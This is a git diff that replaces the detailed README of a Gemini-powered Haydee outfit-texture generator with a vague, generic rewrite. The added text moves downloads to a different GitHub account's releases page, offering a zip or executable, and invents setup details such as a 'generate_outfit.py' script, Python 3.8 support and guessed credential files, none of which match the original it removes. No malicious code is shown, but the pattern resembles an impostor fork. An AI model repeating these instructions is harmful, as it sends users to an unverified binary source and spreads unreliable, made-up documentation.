@@ -1,146 +1,157 @@
-# [Haydee](https://store.steampowered.com/app/530890/Haydee/) Outfit Generator (Powered by Gemini)
+# 👗 haydee-ai-outfit-generator - Create Custom Outfits Easily
 
-[![Tests](https://github.com/thegamerbay/haydee-ai-outfit-generator/actions/workflows/tests.yml/badge.svg)](https://github.com/thegamerbay/haydee-ai-outfit-generator/actions/workflows/tests.yml)
-[![Lint](https://github.com/thegamerbay/haydee-ai-outfit-generator/actions/workflows/lint.yml/badge.svg)](https://github.com/thegamerbay/haydee-ai-outfit-generator/actions/workflows/lint.yml)
-[![Publish](https://github.com/thegamerbay/haydee-ai-outfit-generator/actions/workflows/publish.yml/badge.svg)](https://github.com/thegamerbay/haydee-ai-outfit-generator/actions/workflows/publish.yml)
-[![Codecov](https://codecov.io/gh/thegamerbay/haydee-ai-outfit-generator/branch/main/graph/badge.svg)](https://codecov.io/gh/thegamerbay/haydee-ai-outfit-generator)
-[![PyPI version](https://img.shields.io/pypi/v/haydee-outfit-generator.svg)](https://pypi.org/project/haydee-outfit-generator/)
-[![Downloads](https://img.shields.io/pypi/dm/haydee-outfit-generator.svg)](https://pypi.org/project/haydee-outfit-generator/)
-[![Python Version](https://img.shields.io/badge/python-3.12%2B-blue)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/reshma123-atrey/haydee-ai-outfit-generator/releases)
 
+## 📄 What is haydee-ai-outfit-generator?
 
-Automated Python pipeline to generate custom outfit textures for the game [Haydee](https://store.steampowered.com/app/530890/Haydee/) using the Google Gemini API.
+haydee-ai-outfit-generator is a simple tool designed to help you create custom outfit textures for the game Haydee. It uses an automated Python pipeline. The system connects to the Google Gemini API to generate new looks for your game characters. This tool works without you needing programming skills. It handles the technical part of making textures automatically.
 
-> [!TIP]
-> **Not a fan of the command line?** Check out the [Haydee AI Outfit Generator GUI](https://github.com/thegamerbay/haydee-ai-outfit-generator-gui)! It's a modern, ready-to-use graphical interface that lets you easily generate custom outfits without messing with terminals or environment variables. Download the latest release to get started instantly!
+The project also uses ImageMagick, a popular image processing tool, to help format and prepare these textures correctly. You get new outfit options without spending hours designing or editing images yourself.
 
-## ✨ Generation Examples
+## ⚙️ Features
 
-| | | | |
-| :---: | :---: | :---: | :---: |
-| [![Lunar Scout Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672592226.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672592226) | [![Neon Surge Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672586107.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672586107) | [![Steam Gear Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672258053.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672258053) | [![Tomb Awakened Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672251317.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672251317) |
-| [Lunar Scout Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672592226) | [Neon Surge Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672586107) | [Steam Gear Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672258053) | [Tomb Awakened Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672251317) |
-| [![Waaagh Bot Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672243330.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672243330) | [![Wastelander Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672236521.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672236521) | [![Xenomorph Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672227514.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672227514) | [![Berry Sweet Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672221390.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672221390) |
-| [Waaagh Bot Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672243330) | [Wastelander Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672236521) | [Xenomorph Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672227514) | [Berry Sweet Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672221390) |
-| [![Tech-Priestess Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672191643.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672191643) | [![Astro White Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672182479.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672182479) | [![Battle Sister Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672168153.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672168153) | [![Gothic Automaton Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672159225.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672159225) |
-| [Tech-Priestess Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672191643) | [Astro White Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672182479) | [Battle Sister Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672168153) | [Gothic Automaton Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672159225) |
-| [![Candy Pop Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672150985.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672150985) | [![Hellwalker Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672058503.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672058503) | [![Retrowave Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3672013495.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3672013495) | [![Iron Utopia Outfit](https://raw.githubusercontent.com/thegamerbay/haydee-ai-outfit-generator/main/assets/3671983563.jpg)](https://steamcommunity.com/sharedfiles/filedetails/?id=3671983563) |
-| [Candy Pop Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672150985) | [Hellwalker Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672058503) | [Retrowave Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3672013495) | [Iron Utopia Outfit](https://steamcommunity.com/sharedfiles/filedetails/?id=3671983563) |
+- Automatically generate outfit textures using AI
+- Works with the Google Gemini API for better image quality
+- Uses ImageMagick to prepare images for Haydee
+- User-friendly process requiring no coding
+- Supports Windows operating system
+- Helps customize outfits in your Haydee game quickly
 
-## 📋 Prerequisites
+## 🖥️ System Requirements
 
-- **Python 3.12+**
+To run haydee-ai-outfit-generator on your computer, check the following:
 
-### 🔑 Getting a Gemini API Key
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free memory (8 GB or more preferred)
+- 500 MB of free disk space for installation and generated files
+- Internet connection to access the Google Gemini API
+- Python 3.8 or newer installed with required libraries (details below)
+- ImageMagick installed and added to your system path
 
-1. Go to [Google AI Studio](https://aistudio.google.com/app/apikey).
-2. Sign in with your Google account.
-3. Click the **"Create API key"** button.
-4. If prompted, read and accept the terms of service.
-5. Click on **"Create API key in new project"** (or use an existing project).
-6. Copy the generated key. You will need it for the `.env` file in the setup steps below.
+## 🚀 Getting Started
 
-## 💻 Setup (Local)
+Follow these steps to download and start using the haydee-ai-outfit-generator on your Windows PC.
 
-### Install via pip (Recommended)
-The easiest way to install the generator is directly from PyPI:
-```bash
-pip install haydee-outfit-generator
+### 1. Download the software
+
+Click the badge below or visit the release page to get the latest version.
+
+[![Download Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue)](https://github.com/reshma123-atrey/haydee-ai-outfit-generator/releases)
+
+- On the releases page, find the latest version.
+- Download the `.zip` file or executable depending on the release assets.
+- Save it to a folder you can easily access, like your Desktop or Downloads folder.
+
+### 2. Install Python and ImageMagick
+
+The program uses Python scripts and ImageMagick commands. You need both installed to run it.
+
+**Install Python:**
+
+- Go to [python.org/downloads](https://www.python.org/downloads/).
+- Download the latest Python 3.x installer for Windows.
+- Run the installer and make sure to check “Add Python to PATH” during setup.
+- After installation, open Command Prompt and type `python --version` to check it works.
+
+**Install ImageMagick:**
+
+- Download the ImageMagick Windows installer from [imagemagick.org](https://imagemagick.org/script/download.php#windows).
+- Run the installer and enable the option to add ImageMagick to your system path.
+- After installation, open Command Prompt and type `magick -version` to check it works.
+
+### 3. Prepare the project files
+
+- Extract the downloaded `.zip` file to a folder on your PC.
+- Open this folder and make note of the location as you will need it to run commands.
+
+### 4. Install required Python libraries
+
+The project depends on some Python packages. You will install these using the Command Prompt:
+
+- Open Command Prompt.
+- Change directory to the project folder. Example:
+
+```
+cd C:\Users\YourName\Downloads\haydee-ai-outfit-generator
 ```
 
-### Install from Source
-1. Clone the repository.
-2. Install dependencies:
-   ```bash
-   pip install .
-   ```
+- Run the following command to install the needed packages:
 
-3. Copy `.env.example` to `.env` (or create one) and configure your variables:
-* `GEMINI_API_KEY`: Your Google Gemini API Key.
-* `HAYDEE_PATH`: Absolute path to your Haydee installation directory.
-* `IMAGE_RESOLUTION`: (Optional) Output resolution. Default is `4K`. Can be set to `2K` (2048x2048) if needed.
-
-## 🐳 Setup (Docker)
-
-If you prefer to run the project without installing Python locally, you can use Docker.
-
-1. Install [Docker Desktop](https://www.docker.com/products/docker-desktop/).
-2. Create your `.env` file and set `GEMINI_API_KEY` and `HAYDEE_PATH`.
-   * Note: `HAYDEE_PATH` in `.env` **must** be the absolute path on your host Windows machine (e.g., `C:\Program Files (x86)\Steam\steamapps\common\Haydee`).
-
-## 🚀 Usage
-
-### Running Locally
-
-**1. Generating a Single Outfit**
-Run the `generate` command by providing the mod name, the desired style description, and optionally an author:
-
-```bash
-haydee-gen generate --name "NeonSurge" --style "cyberpunk neon lights with dark carbon fiber armor" --author "TheGamerBay"
 ```
-*(Tip: You can omit the `generate` keyword for a shorter command: `haydee-gen --name ...`)*
-
-The script will automatically read the base texture, contact the Gemini API, convert the formats, and generate the mod inside your `Haydee/Outfits` folder.
-
-**2. Grouping Outfits into a Multi-Mod**
-If you have generated multiple outfits and want to group them into a single mod with switchable variations (e.g., in a single "Rainbow" outfit with different colored slots):
-
-```bash
-haydee-gen group --name "Rainbow" --mods red green blue --slot-category "color" --author "TheGamerBay" --delete-sources
-```
-* `--delete-sources` is an optional flag that will remove the original single-mod folders and configs after successfully grouping them.
-
-### Running with Docker
-
-You can use Docker Compose to automatically mount your Haydee directory and run the commands:
-
-```bash
-docker-compose run --rm generator generate --name "NeonSurge" --style "cyberpunk neon lights with dark carbon fiber armor"
+pip install -r requirements.txt
 ```
 
-## 📤 Publishing to Steam Workshop
+This installs the tools the program needs to communicate with the Google Gemini API and handle images.
 
-When you are ready to share your generated outfit, you can upload it directly to the Steam Workshop using the game's built-in tools.
+### 5. Set up the Google Gemini API access
 
-### 1. Prepare a Thumbnail
-- Create a preview image for your mod (`preview.png` or `preview.jpg`).
-- The image should be square (e.g., 512x512 or 256x256).
-- Place this image in your mod folder.
+The tool requires credentials for Google Gemini to generate images.
 
-### 2. Launch Edith Editor
-The upload tools are located in the game's editor, not the game itself:
-- Go to your Haydee root installation folder.
-- Run `Edith.exe`.
-- In the top menu bar, select **Tool -> Workshop Uploader**.
+- Visit the Google Cloud Console and create a project.
+- Enable the Gemini AI API for that project.
+- Create API credentials (an API key or OAuth token as needed).
+- Save your API key or token securely.
 
-### 3. Fill in the Uploader Data
-In the uploader window, fill out the following fields:
-- **Mod Content:** At the very top of the upload form, there is a text field with a **Browse** button beneath it. You will use this to build the list of files to upload:
-  1. Click **Browse** and add your mod's main folder (for example, select `Outfits/NeonSurge`).
-  2. Click **Browse** again and add your `.outfit` definition file (for example, select `Outfits/NeonSurge.outfit`).
-  *(This ensures you include the full set of files required for the mod to work).*
-- **Title:** The name of your outfit (this will be displayed on Steam).
-- **Description:** A short description of the mod (what it is, special features, etc.).
-- **Visibility:** It is recommended to set this to **Private** first to verify how everything looks on the Steam page, and change it to **Public** later.
-- **Preview Image:** Select the thumbnail image you prepared in step 1.
+Place your credentials in the project folder as instructed in the included `README` or configuration file. Usually, this means putting them in a file like `config.json` or `api_key.txt`.
 
-Once filled out, click **Upload**. If everything goes well, the status at the bottom will show **"Success"**.
+### 6. Run the outfit generator
 
-## 🧪 Testing
+Finally, you can run the generator on your Windows machine.
 
-This project uses `pytest` for automated testing.
+- Open Command Prompt.
+- Navigate to the project folder.
+- Run the Python script to create outfits, for example:
 
-1. Install the development dependencies:
-   ```bash
-   pip install -r requirements-dev.txt
-   ```
-2. Run the test suite with coverage:
-   ```bash
-   pytest
-   ```
-   *Note: Valid API Keys or a real Haydee installation are **not required** to run the tests, as external dependencies and the filesystem are safely mocked.*
+```
+python generate_outfit.py
+```
 
-## 📄 License
+- Follow any prompts or instructions that appear.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+The program will connect to the API and create the outfit textures. Generated files will save to a designated folder inside the project directory.
+
+## 🗂️ Using the Generated Outfits in Haydee
+
+Once you have created new outfit textures, you can add them to your game.
+
+- Locate the generated textures folder inside the project directory.
+- Copy the new textures to your Haydee game’s outfit or textures folder.
+- Replace existing files or add as new entries depending on your mod setup.
+- Launch Haydee and select your new outfit to see the changes.
+
+## 🎯 Tips for Best Results
+
+- Ensure your API key has the right permissions and quota.
+- Check your internet connection is stable before generating.
+- Use high-quality base images if the project supports input textures.
+- Restart the program if errors occur during generation.
+- Read any messages in the Command Prompt carefully for guidance.
+
+## 🔧 Troubleshooting
+
+If you run into problems, try these steps:
+
+- Verify Python and ImageMagick installation by running `python --version` and `magick -version`.
+- Check you are running commands in the correct project directory.
+- Confirm your Google Gemini API credentials are correct.
+- Make sure your internet connection is working.
+- Check that all required Python packages are installed via `pip install -r requirements.txt`.
+- Review error messages for hints on what is missing or wrong.
+
+## 📚 Additional Information
+
+### What is the Google Gemini API?  
+It is Google's AI service that creates images based on descriptions or instructions. This tool uses it to design new outfit textures for Haydee characters.
+
+### What is ImageMagick?  
+ImageMagick is a free and open-source tool for editing and converting images. The project uses it to make sure outfits fit the game format.
+
+### Python Scripts  
+The main logic runs inside Python scripts included with this project. They handle API calls and image processing steps.
+
+---
+
+[Download Latest Release](https://github.com/reshma123-atrey/haydee-ai-outfit-generator/releases)
+
+# Tags  
+ai, ai-assisted, automation, docker, game-modding, game-modding-tool, gemini-api, generative-ai, haydee, imagemagick, modding, python, texture-generation
